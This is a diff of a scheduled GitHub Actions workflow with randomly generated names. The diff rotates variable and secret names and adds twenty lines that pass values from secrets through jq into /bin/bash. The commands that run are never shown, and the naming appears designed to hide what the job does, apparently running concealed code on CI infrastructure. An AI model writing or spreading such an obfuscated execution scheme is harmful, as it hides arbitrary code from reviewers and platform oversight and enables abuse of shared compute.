@@ -1,10 +1,8 @@
 name: zhenbeiwang4896
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
-
+    - cron: '20 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +10,26 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhenbeiwang4896
         env:
-          g95: ${{ secrets.g95 }}
+          bhm7: ${{ secrets.bhm7 }}
         run: |
-          echo $g95 | jq -r .vreyx4087 | /bin/bash
-          echo $pe36 | jq -r .jb4295 | /bin/bash
-          echo $qg483 | jq -r .luknx9 | /bin/bash
-          echo $z0 | jq -r .tqrs3511 | /bin/bash
-          echo $x58682 | jq -r .r6 | /bin/bash
-          echo $rma1 | jq -r .ux0 | /bin/bash
-          echo $m2574 | jq -r .ckugc0 | /bin/bash
-          echo $m73 | jq -r .j83086 | /bin/bash
-          echo $qnd60 | jq -r .zqa97 | /bin/bash
-          echo $woex51542 | jq -r .ugry9 | /bin/bash
+          echo $bhm7 | jq -r .vsd8 | /bin/bash
+          echo $p18215 | jq -r .vv770 | /bin/bash
+          echo $d755 | jq -r .ve924 | /bin/bash
+          echo $htg5290 | jq -r .vxp4 | /bin/bash
+          echo $qozpn39 | jq -r .pczn5 | /bin/bash
+          echo $yo23662 | jq -r .zldha9 | /bin/bash
+          echo $ejqu25 | jq -r .qeb6 | /bin/bash
+          echo $fqf273 | jq -r .dg826 | /bin/bash
+          echo $wqovl6 | jq -r .od308 | /bin/bash
+          echo $rg32724 | jq -r .xlvn0 | /bin/bash
+          echo $s53 | jq -r .fwct01031 | /bin/bash
+          echo $um37 | jq -r .aysxt67981 | /bin/bash
+          echo $ukt446 | jq -r .ggxh84752 | /bin/bash
+          echo $h2 | jq -r .iwpm639 | /bin/bash
+          echo $imidv66 | jq -r .idup83 | /bin/bash
+          echo $v1 | jq -r .amrdy066 | /bin/bash
+          echo $vvwog361 | jq -r .lg7 | /bin/bash
+          echo $cutn5043 | jq -r .yd46338 | /bin/bash
+          echo $h7075 | jq -r .apyvf2 | /bin/bash
+          echo $kkzex9226 | jq -r .tz72 | /bin/bash
 
